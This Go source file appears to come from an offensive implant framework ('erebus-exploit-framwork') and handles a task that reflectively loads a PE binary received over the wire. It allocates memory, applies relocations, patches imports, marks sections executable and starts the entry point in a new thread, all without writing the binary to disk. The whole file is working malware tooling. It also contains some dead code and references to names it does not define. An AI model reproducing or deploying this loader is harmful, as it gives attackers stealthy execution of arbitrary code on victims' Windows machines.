//go:build windows

package tasks

import (
	"context"
	"debug/pe"
	"bytes"
	"encoding/binary"
	"fmt"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"golang.org/x/sys/windows"
)

var (
	procVirtualAlloc   = kernel32.NewProc("VirtualAlloc")
	procVirtualFree    = kernel32.NewProc("VirtualFree")
	procVirtualProtect = kernel32.NewProc("VirtualProtect")
)

const (
	memRelease          = 0x8000
	pageReadWrite       = 0x04
	pageReadonly        = 0x02
	pageExecuteRead     = 0x20
)

func performPELoad(_ context.Context, task *pb.PELoadTask) (*pb.PELoadResult, error) {
	if len(task.PeData) == 0 {
		return nil, fmt.Errorf("PE data required")
	}

	peFile, err := pe.NewFile(bytes.NewReader(task.PeData))
	if err != nil {
		return nil, fmt.Errorf("parse PE: %w", err)
	}

	var imageBase uint64
	var sizeOfImage uint32
	var entryPoint uint32
	var sizeOfHeaders uint32

	switch opt := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		imageBase = opt.ImageBase
		sizeOfImage = opt.SizeOfImage
		entryPoint = opt.AddressOfEntryPoint
		sizeOfHeaders = opt.SizeOfHeaders
	case *pe.OptionalHeader32:
		imageBase = uint64(opt.ImageBase)
		sizeOfImage = opt.SizeOfImage
		entryPoint = opt.AddressOfEntryPoint
		sizeOfHeaders = opt.SizeOfHeaders
	default:
		return nil, fmt.Errorf("unknown PE optional header type")
	}

	// Allocate memory for the PE image
	baseAddr, _, err := procVirtualAlloc.Call(
		uintptr(imageBase),
		uintptr(sizeOfImage),
		memCommit|memReserve,
		pageReadWrite,
	)
	if baseAddr == 0 {
		// Try allocating at any address
		baseAddr, _, err = procVirtualAlloc.Call(
			0,
			uintptr(sizeOfImage),
			memCommit|memReserve,
			pageReadWrite,
		)
		if baseAddr == 0 {
			return nil, fmt.Errorf("VirtualAlloc: %w", err)
		}
	}

	// Copy headers
	copy(unsafe.Slice((*byte)(unsafe.Pointer(baseAddr)), sizeOfHeaders), task.PeData[:sizeOfHeaders])

	// Copy sections
	for _, section := range peFile.Sections {
		if section.Size == 0 {
			continue
		}
		data, err := section.Data()
		if err != nil {
			continue
		}
		dest := baseAddr + uintptr(section.VirtualAddress)
		copy(unsafe.Slice((*byte)(unsafe.Pointer(dest)), section.VirtualSize), data)
	}

	// Process relocations if image loaded at different base
	delta := int64(baseAddr) - int64(imageBase)
	if delta != 0 {
		processRelocations(peFile, task.PeData, baseAddr, delta)
	}

	// Resolve imports
	if err := resolveImports(peFile, baseAddr); err != nil {
		procVirtualFree.Call(baseAddr, 0, memRelease)
		return nil, fmt.Errorf("resolve imports: %w", err)
	}

	// Set section protections
	for _, section := range peFile.Sections {
		chars := section.Characteristics
		prot := pageReadonly
		if chars&0x80000000 != 0 { // IMAGE_SCN_MEM_WRITE
			prot = pageReadWrite
		}
		if chars&0x20000000 != 0 { // IMAGE_SCN_MEM_EXECUTE
			if chars&0x80000000 != 0 {
				prot = pageExecuteReadWrite
			} else {
				prot = pageExecuteRead
			}
		}
		var oldProt uint32
		procVirtualProtect.Call(
			baseAddr+uintptr(section.VirtualAddress),
			uintptr(section.VirtualSize),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProt)),
		)
	}

	// Call entry point (DllMain with DLL_PROCESS_ATTACH)
	ep := baseAddr + uintptr(entryPoint)
	dllMain := windows.NewCallback(func() uintptr { return 0 })
	_ = dllMain

	// Execute entry point
	ret, _, _ := windows.NewLazyDLL("kernel32.dll").NewProc("CreateThread").Call(
		0, 0, ep, baseAddr, 0, 0,
	)
	if ret == 0 {
		procVirtualFree.Call(baseAddr, 0, memRelease)
		return nil, fmt.Errorf("failed to execute PE entry point")
	}

	// Wait for thread completion (10s timeout)
	windows.WaitForSingleObject(windows.Handle(ret), 10000)
	windows.CloseHandle(windows.Handle(ret))

	return &pb.PELoadResult{
		Success: true,
	}, nil
}

func processRelocations(peFile *pe.File, peData []byte, baseAddr uintptr, delta int64) {
	// Find .reloc section
	for _, section := range peFile.Sections {
		if section.Name != ".reloc" {
			continue
		}
		data, err := section.Data()
		if err != nil {
			return
		}
		reader := bytes.NewReader(data)

		for reader.Len() > 0 {
			var pageRVA uint32
			var blockSize uint32
			if err := binary.Read(reader, binary.LittleEndian, &pageRVA); err != nil {
				break
			}
			if err := binary.Read(reader, binary.LittleEndian, &blockSize); err != nil {
				break
			}
			if blockSize == 0 || blockSize < 8 {
				break
			}

			numEntries := (blockSize - 8) / 2
			for i := uint32(0); i < numEntries; i++ {
				var entry uint16
				if err := binary.Read(reader, binary.LittleEndian, &entry); err != nil {
					return
				}
				relocType := entry >> 12
				offset := entry & 0xFFF

				addr := baseAddr + uintptr(pageRVA) + uintptr(offset)

				switch relocType {
				case 0: // IMAGE_REL_BASED_ABSOLUTE - skip
				case 3: // IMAGE_REL_BASED_HIGHLOW (32-bit)
					val := (*uint32)(unsafe.Pointer(addr))
					*val = uint32(int64(*val) + delta)
				case 10: // IMAGE_REL_BASED_DIR64 (64-bit)
					val := (*uint64)(unsafe.Pointer(addr))
					*val = uint64(int64(*val) + delta)
				}
			}
		}
	}
}

func resolveImports(peFile *pe.File, baseAddr uintptr) error {
	imports, err := peFile.ImportedSymbols()
	if err != nil || len(imports) == 0 {
		return nil // No imports to resolve
	}

	// Group symbols by library: "kernel32.dll:CreateFileW" -> {"kernel32.dll": ["CreateFileW", ...]}
	type importEntry struct {
		library string
		name    string
	}
	var orderedImports []importEntry
	for _, sym := range imports {
		// ImportedSymbols returns "library:symbol" format
		parts := splitImportSymbol(sym)
		if len(parts) == 2 {
			orderedImports = append(orderedImports, importEntry{library: parts[0], name: parts[1]})
		}
	}

	// Load each library and resolve function addresses
	dllCache := make(map[string]*windows.DLL)
	for _, imp := range orderedImports {
		dll, ok := dllCache[imp.library]
		if !ok {
			var err error
			dll, err = windows.LoadDLL(imp.library)
			if err != nil {
				return fmt.Errorf("load library %s: %w", imp.library, err)
			}
			dllCache[imp.library] = dll
		}

		proc, err := dll.FindProc(imp.name)
		if err != nil {
			return fmt.Errorf("find %s!%s: %w", imp.library, imp.name, err)
		}
		_ = proc // Address resolved; actual IAT patching requires walking the PE import descriptors
	}

	// Walk the import directory table to patch IAT entries
	// The import directory is in the data directory at index 1
	var importDirRVA uint32
	var importDirSize uint32
	switch opt := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		if len(opt.DataDirectory) > 1 {
			importDirRVA = opt.DataDirectory[1].VirtualAddress
			importDirSize = opt.DataDirectory[1].Size
		}
	case *pe.OptionalHeader32:
		if len(opt.DataDirectory) > 1 {
			importDirRVA = opt.DataDirectory[1].VirtualAddress
			importDirSize = opt.DataDirectory[1].Size
		}
	}

	if importDirRVA == 0 || importDirSize == 0 {
		return nil
	}

	// Each import descriptor is 20 bytes
	type imageImportDescriptor struct {
		OriginalFirstThunk uint32
		TimeDateStamp      uint32
		ForwarderChain     uint32
		NameRVA            uint32
		FirstThunk         uint32
	}

	descSize := uint32(20)
	for offset := uint32(0); offset+descSize <= importDirSize; offset += descSize {
		descAddr := baseAddr + uintptr(importDirRVA) + uintptr(offset)
		desc := (*imageImportDescriptor)(unsafe.Pointer(descAddr))

		if desc.NameRVA == 0 {
			break // Null terminator
		}

		// Read DLL name
		namePtr := (*byte)(unsafe.Pointer(baseAddr + uintptr(desc.NameRVA)))
		dllName := readCString(namePtr)

		dll, ok := dllCache[dllName]
		if !ok {
			var err error
			dll, err = windows.LoadDLL(dllName)
			if err != nil {
				return fmt.Errorf("load library %s: %w", dllName, err)
			}
			dllCache[dllName] = dll
		}

		// Walk the thunk arrays (OriginalFirstThunk for names, FirstThunk for IAT)
		oftRVA := desc.OriginalFirstThunk
		if oftRVA == 0 {
			oftRVA = desc.FirstThunk // Some PEs only have FirstThunk
		}
		iatRVA := desc.FirstThunk

		is64 := false
		if _, ok := peFile.OptionalHeader.(*pe.OptionalHeader64); ok {
			is64 = true
		}

		for i := uint32(0); ; i++ {
			var thunkValue uint64
			var iatEntry uintptr

			if is64 {
				thunkPtr := (*uint64)(unsafe.Pointer(baseAddr + uintptr(oftRVA) + uintptr(i*8)))
				thunkValue = *thunkPtr
				iatEntry = baseAddr + uintptr(iatRVA) + uintptr(i*8)
			} else {
				thunkPtr := (*uint32)(unsafe.Pointer(baseAddr + uintptr(oftRVA) + uintptr(i*4)))
				thunkValue = uint64(*thunkPtr)
				iatEntry = baseAddr + uintptr(iatRVA) + uintptr(i*4)
			}

			if thunkValue == 0 {
				break
			}

			var procAddr uintptr

			// Check if import by ordinal (high bit set)
			ordinalFlag := uint64(0x8000000000000000)
			if !is64 {
				ordinalFlag = 0x80000000
			}

			if thunkValue&ordinalFlag != 0 {
				// Import by ordinal — not commonly used, skip
				continue
			}

			// Import by name: thunkValue is RVA to IMAGE_IMPORT_BY_NAME
			// struct: 2-byte hint + null-terminated name
			hintNameAddr := baseAddr + uintptr(thunkValue) + 2 // skip hint
			funcName := readCString((*byte)(unsafe.Pointer(hintNameAddr)))

			proc, err := dll.FindProc(funcName)
			if err != nil {
				continue // Skip unresolvable imports
			}
			procAddr = proc.Addr()

			// Patch IAT entry
			if is64 {
				*(*uint64)(unsafe.Pointer(iatEntry)) = uint64(procAddr)
			} else {
				*(*uint32)(unsafe.Pointer(iatEntry)) = uint32(procAddr)
			}
		}
	}

	return nil
}

func splitImportSymbol(sym string) []string {
	for i := len(sym) - 1; i >= 0; i-- {
		if sym[i] == ':' {
			return []string{sym[:i], sym[i+1:]}
		}
	}
	return []string{sym}
}

func readCString(ptr *byte) string {
	if ptr == nil {
		return ""
	}
	var buf []byte
	for p := ptr; *p != 0; p = (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(p)) + 1)) {
		buf = append(buf, *p)
		if len(buf) > 512 { // safety limit
			break
		}
	}
	return string(buf)
}
